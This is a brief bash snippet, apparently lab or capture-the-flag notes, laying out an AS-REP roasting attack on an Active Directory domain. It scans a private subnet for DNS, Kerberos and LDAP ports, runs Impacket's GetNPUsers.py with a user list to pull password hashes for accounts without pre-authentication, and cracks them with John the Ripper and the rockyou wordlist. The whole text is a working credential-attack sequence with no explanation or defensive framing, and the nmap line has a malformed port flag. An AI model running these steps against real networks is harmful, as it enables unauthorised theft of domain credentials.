```bash

nmap -sC -A - 53,88,389 192.168.0.0/24
python3 GetNPUsers.py SKILL.com/ -no-pass -usersfile ~/users.txt -dc-ip 192.168.0.222
copy the hash from output and paste in a txt file a.txt
john --wordlist=rockyou.txt ~/a.txt
```
